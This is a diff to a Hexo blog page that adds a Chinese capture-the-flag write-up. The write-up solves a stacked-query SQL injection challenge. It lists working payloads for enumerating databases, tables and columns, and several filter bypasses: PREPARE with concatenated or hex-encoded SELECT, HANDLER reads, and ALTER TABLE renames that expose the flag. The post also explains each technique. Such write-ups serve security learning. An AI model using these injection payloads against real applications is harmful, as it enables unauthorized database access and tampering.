@@ -71,6 +71,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-未命名的Markdown文件" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/14/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%9A%84Markdown%E6%96%87%E4%BB%B6/" class="article-date">
+  <time class="dt-published" datetime="2023-01-14T13:39:46.506Z" itemprop="datePublished">2023-01-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <span id="more"></span>
+<p>首先打开是这个网页<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_7bb7959d80d7ea3790455f58525729f1.png"><br>看到这个首先想到的是</p>
+<ul>
+<li>输入  1’ or 1&#x3D;1;#<br>出现<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_bd0d497994f50cf39b7bb43cf8dddf3d.png"><br>到这我们想到了查表 试一试</li>
+<li>输入 1’;show databases;#<br>出现<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_0fe65f17950f1c827ffe09666c2c48a2.png"><br>按步骤接下来应该是查看数据表</li>
+<li>输入  1’;show tables;#</li>
+<li><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_c60cf1adcf442c342b253fd8bacab4ad.png"></li>
+<li>然后输入1’; show columns from <code>1919810931114514</code>;#</li>
+<li><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_dc28f4aaf6590ccb25d8eb9f3cc140da.png"><br>发现了有flag<br>最后查了一下发现handle<br>通过1’;HANDLER <code>1919810931114514</code> OPEN;HANDLER <code>1919810931114514</code> READ NEXT;HANDLER <code>1919810931114514</code> CLOSE;<br>直接得出了flag{9f7fd2d8-838a-4e3d-bdbc-7f7b4a55d4c3}<br><img src="https://huatu.98youxi.com/markdown/work/uploads/upload_755584afb39ecee7d55d95538adff3a7.png"><br>第二种  也就是做到最后时</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# ，然后通过1&#x27; or 1 = 1 #，成功获取到flag。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">因为select关键字被过滤了，所以我们可以通过预编译的方式拼接select 关键字：1&#x27;;PREPARE hacker from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` &#x27;);EXECUTE hacker;#得flag：flag&#123;c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3&#125; （关于预编译的讲解请见下文）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">前几步和方法一一致，最后一步（第8步），我们可以直接将select * from `1919810931114514`语句进行16进制编码，即：73656c656374202a2066726f6d20603139313938313039333131313435313460，替换payload：</span><br><span class="line"></span><br><span class="line">1&#x27;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;#</span><br><span class="line"></span><br><span class="line">同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</span><br><span class="line"></span><br><span class="line">1&#x27;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</span><br><span class="line"></span><br><span class="line">方法三</span><br><span class="line">最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：1&#x27;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);# ，然后通过1&#x27; or 1 = 1 #，成功获取到flag。 （关于更改表名的讲解请见下文）</span><br><span class="line"></span><br><span class="line">方法四</span><br><span class="line">此题还可以通过handle直接出答案：1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br><span class="line"></span><br><span class="line">（关于的handle的讲解请见下文）</span><br><span class="line"></span><br><span class="line">知识详解</span><br><span class="line">1.预编译</span><br><span class="line">预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line"></span><br><span class="line">PREPARE 名称 FROM 	Sql语句 ? ;</span><br><span class="line">SET @x=xx;</span><br><span class="line">EXECUTE 名称 USING @x;</span><br><span class="line">举例：查询ID为1的用户：</span><br><span class="line"></span><br><span class="line">方法一：</span><br><span class="line">SElECT * FROM t_user WHERE USER_ID = 1</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">EXECUTE jia;</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line">PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;</span><br><span class="line">SET @ID = 1;</span><br><span class="line">EXECUTE jia USING @ID;</span><br><span class="line"></span><br><span class="line">方法四：</span><br><span class="line">SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">PREPARE jia FROM @SQL;</span><br><span class="line">EXECUTE jia;</span><br><span class="line">2. 更改表名</span><br><span class="line">修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；</span><br><span class="line">修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</span><br><span class="line">3.handle</span><br><span class="line">handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</span><br><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/14/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%9A%84Markdown%E6%96%87%E4%BB%B6/" data-id="clcvzxj3p00002ol27s7f9r87" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/01/14/hello-world/" class="article-date">
@@ -190,6 +229,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/01/14/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%9A%84Markdown%E6%96%87%E4%BB%B6/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2023/01/14/hello-world/">Hello World</a>
